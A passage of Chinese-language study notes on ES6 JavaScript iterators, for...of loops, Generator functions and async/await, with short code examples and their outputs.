下面的例子是数组的Symbol.iterator属性\r\n\r\n\t\t- let arr = ['a', 'b', 'c'];\r\nlet iter = arr[Symbol.iterator]();\r\n\r\niter.next() // { value: 'a', done: false }\r\niter.next() // { value: 'b', done: false }\r\niter.next() // { value: 'c', done: false }\r\niter.next() // { value: undefined, done: true }\r\n\r\n- Map\r\n- Set\r\n- String\r\n- TypedArray\r\n- 函数的 arguments 对象\r\n- NodeList 对象\r\n\r\n### 调用 Iterator 接口的场合\r\n\r\n- （1）解构赋值\r\n\r\n\t- 对数组和 Set 结构进行解构赋值时，会默认调用Symbol.iterator方法。\r\n\r\n\t\t- let set = new Set().add('a').add('b').add('c');\r\n\r\nlet [x,y] = set;\r\n// x='a'; y='b'\r\n\r\nlet [first, ...rest] = set;\r\n// first='a'; rest=['b','c'];\r\n\r\n- （2）扩展运算符\r\n\r\n\t- 扩展运算符（...）也会调用默认的 Iterator 接口。\r\n\r\n\t\t- // 例一\r\nvar str = 'hello';\r\n[...str] //  ['h','e','l','l','o']\r\n\r\n// 例二\r\nlet arr = ['b', 'c'];\r\n['a', ...arr, 'd']\r\n// ['a', 'b', 'c', 'd']\r\n\r\n\t\t\t- 实际上，这提供了一种简便机制，可以将任何部署了 Iterator 接口的数据结构，转为数组。\r\n也就是说，只要某个数据结构部署了 Iterator 接口，就可以对它使用扩展运算符，将其转为数组。\r\n\r\n\t\t\t\t- let arr = [...iterable];\r\n\r\n- （3）yield*\r\n\r\n\t- yield*后面跟的是一个可遍历的结构，它会调用该结构的遍历器接口。\r\n\r\n\t\t- let generator = function* () {\r\n  yield 1;\r\n  yield* [2,3,4];\r\n  yield 5;\r\n};\r\n\r\nvar iterator = generator();\r\n\r\niterator.next() // { value: 1, done: false }\r\niterator.next() // { value: 2, done: false }\r\niterator.next() // { value: 3, done: false }\r\niterator.next() // { value: 4, done: false }\r\niterator.next() // { value: 5, done: false }\r\niterator.next() // { value: undefined, done: true }\r\n\r\n- （4）其他场合\r\n\r\n\t- 由于数组的遍历会调用遍历器接口，所以任何接受数组作为参数的场合，其实\r\n都调用了遍历器接口。下面是一些例子。\r\n\r\n\t\t- for...of\r\nArray.from()\r\nMap(), Set(), WeakMap(), WeakSet()（比如new Map([['a',1],['b',2]])）\r\nPromise.all()\r\nPromise.race()\r\n\r\n### 字符串的 Iterator 接口\r\n\r\n- 字符串是一个类似数组的对象，也原生具有 Iterator 接口。\r\n\r\n\t- var someString = \"hi\";\r\ntypeof someString[Symbol.iterator]\r\n// \"function\"\r\n\r\nvar iterator = someString[Symbol.iterator]();\r\n\r\niterator.next()  // { value: \"h\", done: false }\r\niterator.next()  // { value: \"i\", done: false }\r\niterator.next()  // { value: undefined, done: true }\r\n\r\n\t\t- 上面代码中，调用Symbol.iterator方法返回一个遍历器对象，在这个遍历器上可以调用 next 方法，实现对于字符串的遍历。\r\n\r\n可以覆盖原生的Symbol.iterator方法，达到修改遍历器行为的目的。\r\n\r\n\t\t\t- var str = new String(\"hi\");\r\n\r\n[...str] // [\"h\", \"i\"]\r\n\r\nstr[Symbol.iterator] = function() {\r\n  return {\r\n    next: function() {\r\n      if (this._first) {\r\n        this._first = false;\r\n        return { value: \"bye\", done: false };\r\n      } else {\r\n        return { done: true };\r\n      }\r\n    },\r\n    _first: true\r\n  };\r\n};\r\n\r\n[...str] // [\"bye\"]\r\nstr // \"hi\"\r\n\r\n### Iterator 接口与 Generator 函数\r\n\r\n- Symbol.iterator方法的最简单实现，还是使用下一章要介绍的 Generator 函数。\r\n\r\n\t- let myIterable = {\r\n  [Symbol.iterator]: function* () {\r\n    yield 1;\r\n    yield 2;\r\n    yield 3;\r\n  }\r\n}\r\n[...myIterable] // [1, 2, 3]\r\n\r\n// 或者采用下面的简洁写法\r\n\r\nlet obj = {\r\n  * [Symbol.iterator]() {\r\n    yield 'hello';\r\n    yield 'world';\r\n  }\r\n};\r\n\r\nfor (let x of obj) {\r\n  console.log(x);\r\n}\r\n// \"hello\"\r\n// \"world\"\r\n\r\n\t\t- 上面代码中，Symbol.iterator方法几乎不用部署任何代码，只要用 yield 命令\r\n给出每一步的返回值即可。\r\n\r\n### 遍历器对象的 return()，throw()\r\n\r\n- 遍历器对象除了具有next方法，还可以具有return方法和throw方法。如果你自己写遍历器对象生成函数，那么next方法是必须部署的，return方法和throw方法是否部署是可选的。\r\n\r\nreturn方法的使用场合是，如果for...of循环提前退出（通常是因为出错，或者有break语句），就会调用return方法。如果一个对象在完成遍历前，需要清理或释放资源，就可以部署return方法。\r\n\r\n\t- function readLinesSync(file) {\r\n  return {\r\n    [Symbol.iterator]() {\r\n      return {\r\n        next() {\r\n          return { done: false };\r\n        },\r\n        return() {\r\n          file.close();\r\n          return { done: true };\r\n        }\r\n      };\r\n    },\r\n  };\r\n}\r\n\r\n\t\t- 上面代码中，函数readLinesSync接受一个文件对象作为参数，返回一个遍历器对象，其中除了next方法，还部署了return方法。\r\n下面的两种情况，都会触发执行return方法。\r\n\r\n\t\t\t- // 情况一\r\nfor (let line of readLinesSync(fileName)) {\r\n  console.log(line);\r\n  break;\r\n}\r\n\r\n// 情况二\r\nfor (let line of readLinesSync(fileName)) {\r\n  console.log(line);\r\n  throw new Error();\r\n}\r\n\r\n### for...of 循环\r\n\r\n- ES6 借鉴 C++、Java、C# 和 Python 语言，引入了for...of循环，作为遍历所有数据结构的统一的方法。\r\n\r\n一个数据结构只要部署了Symbol.iterator属性，就被视为具有 iterator 接口，就可以用for...of循环遍历它的成员。也就是说，for...of循环内部调用的是数据结构的Symbol.iterator方法。\r\n\r\nfor...of循环可以使用的范围包括数组、Set 和 Map 结构、某些类似数组的对象（比如arguments对象、DOM NodeList 对象）、后文的 Generator 对象，以及字符串。\r\n\r\n\t- 数组\r\n\r\n\t\t- 数组原生具备iterator接口（即默认部署了Symbol.iterator属性），for...of循环\r\n本质上就是调用这个接口产生的遍历器，可以用下面的代码证明。\r\n\r\n\t\t\t- const arr = ['red', 'green', 'blue'];\r\n\r\nfor(let v of arr) {\r\n  console.log(v); // red green blue\r\n}\r\n\r\nconst obj = {};\r\nobj[Symbol.iterator] = arr[Symbol.iterator].bind(arr);\r\n\r\nfor(let v of obj) {\r\n  console.log(v); // red green blue\r\n}\r\n\r\n\t\t\t\t- 上面代码中，空对象obj部署了数组arr的Symbol.iterator属性，结果obj的for...of循环，产生了与arr完全一样的结果。\r\n\r\nfor...of循环可以代替数组实例的forEach方法。\r\n\r\n\t\t\t\t\t- const arr = ['red', 'green', 'blue'];\r\n\r\narr.forEach(function (element, index) {\r\n  console.log(element); // red green blue\r\n  console.log(index);   // 0 1 2\r\n});\r\n\r\n\t\t\t\t\t\t- JavaScript 原有的for...in循环，只能获得对象的键名，不能直接获取键值。ES6 提供for...of循环，允许遍历获得键值。\r\n\t\t\t\t\t\t- var arr = ['a', 'b', 'c', 'd'];\r\n\r\nfor (let a in arr) {\r\n  console.log(a); // 0 1 2 3\r\n}\r\n\r\nfor (let a of arr) {\r\n  console.log(a); // a b c d\r\n}\r\n\t\t\t\t\t\t- 上面代码表明，for...in循环读取键名，for...of循环读取键值。如果要通过for...of循环，获取数组的索引，可以借助数组实例的entries方法和keys方法（参见《数组的扩展》一章）。\r\n\r\nfor...of循环调用遍历器接口，数组的遍历器接口只返回具有数字索引的属性。这一点跟for...in循环也不一样。\r\n\t\t\t\t\t\t- let arr = [3, 5, 7];\r\narr.foo = 'hello';\r\n\r\nfor (let i in arr) {\r\n  console.log(i); // \"0\", \"1\", \"2\", \"foo\"\r\n}\r\n\r\nfor (let i of arr) {\r\n  console.log(i); //  \"3\", \"5\", \"7\"\r\n}\r\n\t\t\t\t\t\t- 上面代码中，for...of循环不会返回数组arr的foo属性。\r\n\r\n\t- Set 和 Map 结构\r\n\r\n\t\t- Set 和 Map 结构也原生具有 Iterator 接口，可以直接使用for...of循环。\r\n\r\n\t\t\t- var engines = new Set([\"Gecko\", \"Trident\", \"Webkit\", \"Webkit\"]);\r\nfor (var e of engines) {\r\n  console.log(e);\r\n}\r\n// Gecko\r\n// Trident\r\n// Webkit\r\n\r\nvar es6 = new Map();\r\nes6.set(\"edition\", 6);\r\nes6.set(\"committee\", \"TC39\");\r\nes6.set(\"standard\", \"ECMA-262\");\r\nfor (var [name, value] of es6) {\r\n  console.log(name + \": \" + value);\r\n}\r\n// edition: 6\r\n// committee: TC39\r\n// standard: ECMA-262\r\n\t\t\t- 上面代码演示了如何遍历 Set 结构和 Map 结构。值得注意的地方有两个，首先，遍历的顺序是按照各个成员被添加进数据结构的顺序。其次，Set 结构遍历时，返回的是一个值，而 Map 结构遍历时，返回的是一个数组，该数组的两个成员分别为当前 Map 成员的键名和键值。\r\n\t\t\t- let map = new Map().set('a', 1).set('b', 2);\r\nfor (let pair of map) {\r\n  console.log(pair);\r\n}\r\n// ['a', 1]\r\n// ['b', 2]\r\n\r\nfor (let [key, value] of map) {\r\n  console.log(key + ' : ' + value);\r\n}\r\n// a : 1\r\n// b : 2\r\n\r\n\t- 计算生成的数据结构\r\n\r\n\t\t- 有些数据结构是在现有数据结构的基础上，计算生成的。比如，ES6 的数组、Set、Map 都部署了以下三个方法，调用后都返回遍历器对象。\r\n\r\nentries() 返回一个遍历器对象，用来遍历[键名, 键值]组成的数组。对于数组，键名就是索引值；对于 Set，键名与键值相同。Map 结构的 Iterator 接口，默认就是调用entries方法。\r\nkeys() 返回一个遍历器对象，用来遍历所有的键名。\r\nvalues() 返回一个遍历器对象，用来遍历所有的键值。\r\n这三个方法调用后生成的遍历器对象，所遍历的都是计算生成的数据结构。\r\n\r\n\t\t\t- let arr = ['a', 'b', 'c'];\r\nfor (let pair of arr.entries()) {\r\n  console.log(pair);\r\n}\r\n// [0, 'a']\r\n// [1, 'b']\r\n// [2, 'c']\r\n\r\n\t- 类似数组的对象\r\n\r\n\t\t- 类似数组的对象包括好几类。下面是for...of循环用于字符串、DOM NodeList 对象、arguments对象的例子。\r\n\r\n\t\t\t- // 字符串\r\nlet str = \"hello\";\r\n\r\nfor (let s of str) {\r\n  console.log(s); // h e l l o\r\n}\r\n\r\n// DOM NodeList对象\r\nlet paras = document.querySelectorAll(\"p\");\r\n\r\nfor (let p of paras) {\r\n  p.classList.add(\"test\");\r\n}\r\n\r\n// arguments对象\r\nfunction printArgs() {\r\n  for (let x of arguments) {\r\n    console.log(x);\r\n  }\r\n}\r\nprintArgs('a', 'b');\r\n// 'a'\r\n// 'b'\r\n\t\t\t- 并不是所有类似数组的对象都具有 Iterator 接口，一个简便的解决方法，就是使用Array.from方法将其转为数组。\r\n\t\t\t- let arrayLike = { length: 2, 0: 'a', 1: 'b' };\r\n\r\n// 报错\r\nfor (let x of arrayLike) {\r\n  console.log(x);\r\n}\r\n\r\n// 正确\r\nfor (let x of Array.from(arrayLike)) {\r\n  console.log(x);\r\n}\r\n\r\n\t- 对象\r\n\r\n\t\t- 对于普通的对象，for...of结构不能直接使用，会报错，必须部署了 \r\nIterator 接口后才能使用。但是，这样情况下，for...in循环依然可以用来遍历键名。\r\n\r\n\t\t\t- let es6 = {\r\n  edition: 6,\r\n  committee: \"TC39\",\r\n  standard: \"ECMA-262\"\r\n};\r\n\r\nfor (let e in es6) {\r\n  console.log(e);\r\n}\r\n// edition\r\n// committee\r\n// standard\r\n\r\nfor (let e of es6) {\r\n  console.log(e);\r\n}\r\n// TypeError: es6[Symbol.iterator] is not a function\r\n\r\n\t- 与其他遍历语法的比较\r\n\r\n\t\t- 以数组为例，JavaScript 提供多种遍历语法。最原始的写法就是for循环。\r\n\r\n\t\t\t- for (var index = 0; index < myArray.length; index++) {\r\n  console.log(myArray[index]);\r\n}\r\n\r\n\t\t- 这种写法比较麻烦，因此数组提供内置的forEach方法。\r\n\r\n\t\t\t- myArray.forEach(function (value) {\r\n  console.log(value);\r\n});\r\n\t\t\t- 这种写法的问题在于，无法中途跳出forEach循环，break命令或return命令都不能奏效。\r\n\r\n\t\t- for...in循环可以遍历数组的键名。\r\n\r\n\t\t\t- for (var index in myArray) {\r\n  console.log(myArray[index]);\r\n}\r\n\r\n\t\t\t\t- for...in循环有几个缺点。\r\n\r\n\t\t\t\t\t- 数组的键名是数字，但是for...in循环是以字符串作为键名“0”、“1”、“2”等等。\r\n\t\t\t\t\t- for...in循环不仅遍历数字键名，还会遍历手动添加的其他键，甚至包括原型链上的键。\r\n\t\t\t\t\t- 某些情况下，for...in循环会以任意顺序遍历键名。\r\n\t\t\t\t\t- 总之，for...in循环主要是为遍历对象而设计的，不适用于遍历数组。\r\n\r\n\t\t- for...of循环相比上面几种做法，有一些显著的优点。\r\n\r\n\t\t\t- for (let value of myArray) {\r\n  console.log(value);\r\n}\r\n\r\n\t\t\t\t- 有着同for...in一样的简洁语法，但是没有for...in那些缺点。\r\n\t\t\t\t- 不同于forEach方法，它可以与break、continue和return配合使用。\r\n\t\t\t\t- 提供了遍历所有数据结构的统一操作接口。\r\n\t\t\t\t- 下面是一个使用 break 语句，跳出for...of循环的例子。\r\n\r\n\t\t\t\t\t- for (var n of fibonacci) {\r\n  if (n > 1000)\r\n    break;\r\n  console.log(n);\r\n}\r\n\r\n\t\t\t\t\t\t- 上面的例子，会输出斐波纳契数列小于等于 1000 的项。如果当前项大于 1000，就会使用break语句跳出for...of循环。\r\n\r\n## Generator 函数的语法\r\n\r\n### 基本概念\r\n\r\n- Generator 函数是 ES6 提供的一种异步编程解决方案，语法行为与传统函数完全不同。本章详细介绍 Generator 函数的语法和 API，它的异步编程应用请看《Generator 函数的异步应用》一章。\r\n\r\nGenerator 函数有多种理解角度。语法上，首先可以把它理解成，Generator 函数是一个状态机，封装了多个内部状态。\r\n\r\n执行 Generator 函数会返回一个遍历器对象，也就是说，Generator 函数除了状态机，还是一个遍历器对象生成函数。返回的遍历器对象，可以依次遍历 Generator 函数内部的每一个状态。\r\n\r\n形式上，Generator 函数是一个普通函数，但是有两个特征。一是，function关键字与函数名之间有一个星号；二是，函数体内部使用yield表达式，定义不同的内部状态（yield在英语里的意思就是“产出”）。\r\n- function* helloWorldGenerator() {\r\n  yield 'hello';\r\n  yield 'world';\r\n  return 'ending';\r\n}\r\n\r\nvar hw = helloWorldGenerator();\r\n- 上面代码定义了一个 Generator 函数helloWorldGenerator，它内部有两个yield表达式（hello和world），即该函数有三个状态：hello，world 和 return 语句（结束执行）。然后，Generator 函数的调用方法与普通函数一样，也是在函数名后面加上一对圆括号。不同的是，调用 Generator 函数后，该函数并不执行，返回的也不是函数运行结果，而是一个指向内部状态的指针对象，也就是上一章介绍的遍历器对象（Iterator Object）。\r\n\r\n下一步，必须调用遍历器对象的next方法，使得指针移向下一个状态。也就是说，每次调用next方法，内部指针就从函数头部或上一次停下来的地方开始执行，直到遇到下一个yield表达式（或return语句）为止。换言之，Generator 函数是分段执行的，yield表达式是暂停执行的标记，而next方法可以恢复执行。\r\n- hw.next()\r\n// { value: 'hello', done: false }\r\n\r\nhw.next()\r\n// { value: 'world', done: false }\r\n\r\nhw.next()\r\n// { value: 'ending', done: true }\r\n\r\nhw.next()\r\n// { value: undefined, done: true }\r\n\r\n- 上面代码一共调用了四次next方法。\r\n\r\n第一次调用，Generator 函数开始执行，直到遇到第一个yield表达式为止。next方法返回一个对象，它的value属性就是当前yield表达式的值hello，done属性的值false，表示遍历还没有结束。\r\n\r\n第二次调用，Generator 函数从上次yield表达式停下的地方，一直执行到下一个yield表达式。next方法返回的对象的value属性就是当前yield表达式的值world，done属性的值false，表示遍历还没有结束。\r\n\r\n第三次调用，Generator 函数从上次yield表达式停下的地方，一直执行到return语句（如果没有return语句，就执行到函数结束）。next方法返回的对象的value属性，就是紧跟在return语句后面的表达式的值（如果没有return语句，则value属性的值为undefined），done属性的值true，表示遍历已经结束。\r\n\r\n第四次调用，此时 Generator 函数已经运行完毕，next方法返回对象的value属性为undefined，done属性为true。以后再调用next方法，返回的都是这个值。\r\n\r\n总结一下，调用 Generator 函数，返回一个遍历器对象，代表 Generator 函数的内部指针。以后，每次调用遍历器对象的next方法，就会返回一个有着value和done两个属性的对象。value属性表示当前的内部状态的值，是yield表达式后面那个表达式的值；done属性是一个布尔值，表示是否遍历结束。\r\n- function * foo(x, y) { ··· }\r\nfunction *foo(x, y) { ··· }\r\nfunction* foo(x, y) { ··· }\r\nfunction*foo(x, y) { ··· }\r\n由于 Generator 函数仍然是普通函数，所以一般的写法是上面的第三种，即星号紧跟在function关键字后面。本书也采用这种写法。\r\n\r\n### yield 表达式\r\n\r\n- 由于 Generator 函数返回的遍历器对象，只有调用next方法才会遍历下一个内部状态，所以其实提供了一种可以暂停执行的函数。yield表达式就是暂停标志。\r\n\r\n\r\n\r\n\t- 遍历器对象的next方法的运行逻辑如下。\r\n\r\n\t\t- （1）遇到yield表达式，就暂停执行后面的操作，并将紧跟在yield后面的那个表达式的值，作为返回的对象的value属性值。\r\n\t\t- （2）下一次调用next方法时，再继续往下执行，直到遇到下一个yield表达式。\r\n\t\t- （3）如果没有再遇到新的yield表达式，就一直运行到函数结束，直到return语句为止，并将return语句后面的表达式的值，作为返回的对象的value属性值。\r\n\t\t- （4）如果该函数没有return语句，则返回的对象的value属性值为undefined。\r\n\t\t- 需要注意的是，yield表达式后面的表达式，只有当调用next方法、内部指针指向该语句时才会执行，因此等于为 JavaScript 提供了手动的“惰性求值”（Lazy Evaluation）的语法功能。\r\n\t\t- function* gen() {\r\n  yield  123 + 456;\r\n}\r\n\r\n\t\t- 上面代码中，yield后面的表达式123 + 456，不会立即求值，只会在next方法将指针移到这一句时，才会求值。\r\n\r\nyield表达式与return语句既有相似之处，也有区别。相似之处在于，都能返回紧跟在语句后面的那个表达式的值。区别在于每次遇到yield，函数暂停执行，下一次再从该位置继续向后执行，而return语句不具备位置记忆的功能。一个函数里面，只能执行一次（或者说一个）return语句，但是可以执行多次（或者说多个）yield表达式。正常函数只能返回一个值，因为只能执行一次return；Generator 函数可以返回一系列的值，因为可以有任意多个yield。从另一个角度看，也可以说 Generator 生成了一系列的值，这也就是它的名称的来历（英语中，generator 这个词是“生成器”的意思）。\r\n\t\t- Generator 函数可以不用yield表达式，这时就变成了一个单纯的暂缓执行函数。\r\n\t\t- function* f() {\r\n  console.log('执行了！')\r\n}\r\n\r\nvar generator = f();\r\n\r\nsetTimeout(function () {\r\n  generator.next()\r\n}, 2000);\r\n\t\t- 上面代码中，函数f如果是普通函数，在为变量generator赋值时就会执行。但是，函数f是一个 Generator 函数，就变成只有调用next方法时，函数f才会执行。\r\n\r\n另外需要注意，yield表达式只能用在 Generator 函数里面，用在其他地方都会报错。\r\n\r\n- 与 Iterator 接口的关系\r\n\r\n\t- 任意一个对象的Symbol.iterator方法，等于该对象的遍历器生成函数，调用该函数会返回该对象的一个遍历器对象。\r\n\r\n由于 Generator 函数就是遍历器生成函数，因此可以把 Generator 赋值给对象的Symbol.iterator属性，从而使得该对象具有 Iterator 接口。\r\n\r\n\t\t- var myIterable = {};\r\nmyIterable[Symbol.iterator] = function* () {\r\n  yield 1;\r\n  yield 2;\r\n  yield 3;\r\n};\r\n\r\n[...myIterable] // [1, 2, 3]\r\n\t\t- 上面代码中，Generator 函数赋值给Symbol.iterator属性，从而使得myIterable对象具有了 Iterator 接口，可以被...运算符遍历了。\r\n\r\n\t- Generator 函数执行后，返回一个遍历器对象。该对象本身也具有Symbol.iterator属性，执行后返回自身。\r\n\r\n\t\t- function* gen(){\r\n  // some code\r\n}\r\n\r\nvar g = gen();\r\n\r\ng[Symbol.iterator]() === g\r\n// true\r\n\r\n\t\t\t- 上面代码中，gen是一个 Generator 函数，调用它会生成一个遍历器对象g。它的Symbol.iterator属性，也是一个遍历器对象生成函数，执行后返回它自己。\r\n\r\n- next 方法的参数\r\n\r\n\t- yield表达式本身没有返回值，或者说总是返回undefined。next方法可以带一个参数，该参数就会被当作上一个yield表达式的返回值。\r\n\r\n\t\t- function* f() {\r\n  for(var i = 0; true; i++) {\r\n    var reset = yield i;\r\n    if(reset) { i = -1; }\r\n  }\r\n}\r\n\r\nvar g = f();\r\n\r\ng.next() // { value: 0, done: false }\r\ng.next() // { value: 1, done: false }\r\ng.next(true) // { value: 0, done: false }\r\n\t\t- 上面代码先定义了一个可以无限运行的 Generator 函数f，如果next方法没有参数，每次运行到yield表达式，变量reset的值总是undefined。当next方法带一个参数true时，变量reset就被重置为这个参数（即true），因此i会等于-1，下一轮循环就会从-1开始递增。\r\n\r\n这个功能有很重要的语法意义。Generator 函数从暂停状态到恢复运行，它的上下文状态（context）是不变的。通过next方法的参数，就有办法在 Generator 函数开始运行之后，继续向函数体内部注入值。也就是说，可以在 Generator 函数运行的不同阶段，从外部向内部注入不同的值，从而调整函数行为。\r\n\t\t- function* foo(x) {\r\n  var y = 2 * (yield (x + 1));\r\n  var z = yield (y / 3);\r\n  return (x + y + z);\r\n}\r\n\r\nvar a = foo(5);\r\na.next() // Object{value:6, done:false}\r\na.next() // Object{value:NaN, done:false}\r\na.next() // Object{value:NaN, done:true}\r\n\r\nvar b = foo(5);\r\nb.next() // { value:6, done:false }\r\nb.next(12) // { value:8, done:false }\r\nb.next(13) // { value:42, done:true }\r\n\t\t- 上面代码中，第二次运行next方法的时候不带参数，导致 y 的值等于2 * undefined（即NaN），除以 3 以后还是NaN，因此返回对象的value属性也等于NaN。第三次运行Next方法的时候不带参数，所以z等于undefined，返回对象的value属性等于5 + NaN + undefined，即NaN。\r\n\r\n如果向next方法提供参数，返回结果就完全不一样了。上面代码第一次调用b的next方法时，返回x+1的值6；第二次调用next方法，将上一次yield表达式的值设为12，因此y等于24，返回y / 3的值8；第三次调用next方法，将上一次yield表达式的值设为13，因此z等于13，这时x等于5，y等于24，所以return语句的值等于42。\r\n\r\n注意，由于next方法的参数表示上一个yield表达式的返回值，所以在第一次使用next方法时，传递参数是无效的。V8 引擎直接忽略第一次使用next方法时的参数，只有从第二次使用next方法开始，参数才是有效的。从语义上讲，第一个next方法用来启动遍历器对象，所以不用带有参数。\r\n\r\n- for...of 循环\r\n\r\n\t- for...of循环可以自动遍历 Generator 函数时生成的Iterator对象，且此时不再需要调用next方法。\r\n\r\n\t\t- function* foo() {\r\n  yield 1;\r\n  yield 2;\r\n  yield 3;\r\n  yield 4;\r\n  yield 5;\r\n  return 6;\r\n}\r\n\r\nfor (let v of foo()) {\r\n  console.log(v);\r\n}\r\n// 1 2 3 4 5\r\n\r\n\t- 利用for...of循环，可以写出遍历任意对象（object）的方法。原生的 JavaScript 对象没有遍历接口，\r\n无法使用for...of循环，通过 Generator 函数为它加上这个接口，就可以用了。\r\n\r\n\t\t- function* objectEntries(obj) {\r\n  let propKeys = Reflect.ownKeys(obj);\r\n\r\n  for (let propKey of propKeys) {\r\n    yield [propKey, obj[propKey]];\r\n  }\r\n}\r\n\r\nlet jane = { first: 'Jane', last: 'Doe' };\r\n\r\nfor (let [key, value] of objectEntries(jane)) {\r\n  console.log(`${key}: ${value}`);\r\n}\r\n// first: Jane\r\n// last: Doe\r\n\r\n\t- 除了for...of循环以外，扩展运算符（...）、解构赋值和Array.from方法内部调用的，都是遍历器接口。\r\n这意味着，它们都可以将 Generator 函数返回的 Iterator 对象，作为参数。\r\n\r\n\t\t- function* numbers () {\r\n  yield 1\r\n  yield 2\r\n  return 3\r\n  yield 4\r\n}\r\n\r\n// 扩展运算符\r\n[...numbers()] // [1, 2]\r\n\r\n// Array.from 方法\r\nArray.from(numbers()) // [1, 2]\r\n\r\n// 解构赋值\r\nlet [x, y] = numbers();\r\nx // 1\r\ny // 2\r\n\r\n// for...of 循环\r\nfor (let n of numbers()) {\r\n  console.log(n)\r\n}\r\n// 1\r\n// 2\r\n\r\n- Generator.prototype.throw() \r\n\r\n\t- Generator 函数返回的遍历器对象，都有一个throw方法，可以在函数体外抛出错误，然后在 Generator 函数体内捕获。\r\n\r\n\t\t- var g = function* () {\r\n  try {\r\n    yield;\r\n  } catch (e) {\r\n    console.log('内部捕获', e);\r\n  }\r\n};\r\n\r\nvar i = g();\r\ni.next();\r\n\r\ntry {\r\n  i.throw('a');\r\n  i.throw('b');\r\n} catch (e) {\r\n  console.log('外部捕获', e);\r\n}\r\n// 内部捕获 a\r\n// 外部捕获 b\r\n\t\t- 上面代码中，遍历器对象i连续抛出两个错误。第一个错误被 Generator 函数体内的catch语句捕获。i第二次抛出错误，由于 Generator 函数内部的catch语句已经执行过了，不会再捕捉到这个错误了，所以这个错误就被抛出了 Generator 函数体，被函数体外的catch语句捕获。\r\n\t\t- throw方法可以接受一个参数，该参数会被catch语句接收，建议抛出Error对象的实例。\r\n\t\t- var g = function* () {\r\n  try {\r\n    yield;\r\n  } catch (e) {\r\n    console.log(e);\r\n  }\r\n};\r\n\r\nvar i = g();\r\ni.next();\r\ni.throw(new Error('出错了！'));\r\n// Error: 出错了！(…)\r\n\r\n## async 函数\r\n\r\n### 含义\r\n\r\n- ES2017 标准引入了 async 函数，使得异步操作变得更加方便。\r\n\r\nasync 函数是什么？一句话，它就是 Generator 函数的语法糖。\r\n\r\n前文有一个 Generator 函数，依次读取两个文件。\r\n\r\n\t- const fs = require('fs');\r\n\r\nconst readFile = function (fileName) {\r\n  return new Promise(function (resolve, reject) {\r\n    fs.readFile(fileName, function(error, data) {\r\n      if (error) return reject(error);\r\n      resolve(data);\r\n    });\r\n  });\r\n};\r\n\r\nconst gen = function* () {\r\n  const f1 = yield readFile('/etc/fstab');\r\n  const f2 = yield readFile('/etc/shells');\r\n  console.log(f1.toString());\r\n  console.log(f2.toString());\r\n};\r\n\t- 写成async函数，就是下面这样。\r\n\t- const asyncReadFile = async function () {\r\n  const f1 = await readFile('/etc/fstab');\r\n  const f2 = await readFile('/etc/shells');\r\n  console.log(f1.toString());\r\n  console.log(f2.toString());\r\n};\r\n\t- 一比较就会发现，async函数就是将 Generator 函数的星号（*）替换成async，将yield替换成await，仅此而已。\r\n\r\n### async函数对 Generator 函数的改进，体现在以下四点。\r\n\r\n- （1）内置执行器。\r\n\r\nGenerator 函数的执行必须靠执行器，所以才有了co模块，而async函数自带执行器。也就是说，async函数的执行，与普通函数一模一样，只要一行。\r\n\r\n\t- asyncReadFile();\r\n\r\n\t\t- 上面的代码调用了asyncReadFile函数，然后它就会自动执行，输出最后结果。这完全不像 Generator 函数，需要调用next方法，或者用co模块，才能真正执行，得到最后结果。\r\n\r\n- （2）更好的语义。\r\n\r\nasync和await，比起星号和yield，语义更清楚了。async表示函数里有异步操作，await表示紧跟在后面的表达式需要等待结果。\r\n- 3）更广的适用性。\r\n\r\nco模块约定，yield命令后面只能是 Thunk 函数或 Promise 对象，而async函数的await命令后面，可以是 Promise 对象和原始类型的值（数值、字符串和布尔值，但这时等同于同步操作）。\r\n- 4）返回值是 Promise。\r\n\r\nasync函数的返回值是 Promise 对象，这比 Generator 函数的返回值是 Iterator 对象方便多了。你可以用then方法指定下一步的操作。\r\n\r\n进一步说，async函数完全可以看作多个异步操作，包装成的一个 Promise 对象，而await命令就是内部then命令的语法糖。\r\n\r\n### 基本用法\r\n\r\n- async函数返回一个 Promise 对象，可以使用then方法添加回调函数。\r\n当函数执行的时候，一旦遇到await就会先返回，等到异步操作完成，再接着执行函数体内后面的语句。\r\n\r\n\t- async function getStockPriceByName(name) {\r\n  const symbol = await getStockSymbol(name);\r\n  const stockPrice = await getStockPrice(symbol);\r\n  return stockPrice;\r\n}\r\n\r\ngetStockPriceByName('goog').then(function (result) {\r\n  console.log(result);\r\n});\r\n\r\n### 语法\r\n\r\n- 返回 Promise 对象\r\n\r\n\t- async函数返回一个 Promise 对象。\r\n\r\nasync函数内部return语句返回的值，会成为then方法回调函数的参数。\r\n\r\n\t\t- async function f() {\r\n  return 'hello world';\r\n}\r\n\r\nf().then(v => console.log(v))\r\n// \"hello world\"\r\n\r\n\t\t\t- 上面代码中，函数f内部return命令返回的值，会被then方法回调函数接收到。\r\n\r\n- Promise 对象的状态变化\r\n\r\n\t- async function getTitle(url) {\r\n  let response = await fetch(url);\r\n  let html = await response.text();\r\n  return html.match(/<title>([\\s\\S]+)<\\/title>/i)[1];\r\n}\r\ngetTitle('https://tc39.github.io/ecma262/').then(console.log)\r\n// \"ECMAScript 2017 Language Specification\"\r\n\r\n\t\t- 上面代码中，函数getTitle内部有三个操作：抓取网页、取出文本、匹配页面标题。只有这三个操作全部完成，才会执行then方法里面的console.log。\r\n\r\n\r\n\r\n- await 命令\r\n\r\n\t- 正常情况下，await命令后面是一个 Promise 对象。如果不是，就返回对应的值。\r\n\r\n\t\t- async function f() {\r\n  // 等同于\r\n  // return 123;\r\n  return await 123;\r\n}\r\n\r\nf().then(v => console.log(v))\r\n// 123\r\n\r\n\t- await命令后面的 Promise 对象如果变为reject状态，则reject的参数会被catch方法的回调函数接收到。\r\n\r\n\t\t- async function f() {\r\n  await Promise.reject('出错了');\r\n}\r\n\r\nf()\r\n.then(v => console.log(v))\r\n.catch(e => console.log(e))\r\n// 出错了\r\n\t\t- 注意，上面代码中，await语句前面没有return，但是reject方法的参数依然传入了catch方法的回调函数。这里如果在await前面加上return，效果是一样的。\r\n\t\t- 只要一个await语句后面的 Promise 变为reject，那么整个async函数都会中断执行。\r\n\t\t- async function f() {\r\n  await Promise.reject('出错了');\r\n  await Promise.resolve('hello world'); // 不会执行\r\n}\r\n\t\t- 有时，我们希望即使前一个异步操作失败，也不要中断后面的异步操作。这时可以将第一个await放在try...catch结构里面，这样不管这个异步操作是否成功，第二个await都会执行。\r\n\t\t- async function f() {\r\n  try {\r\n    await Promise.reject('出错了');\r\n  } catch(e) {\r\n  }\r\n  return await Promise.resolve('hello world');\r\n}\r\n\r\nf()\r\n.then(v => console.log(v))\r\n// hello world\r\n\t\t- 另一种方法是await后面的 Promise 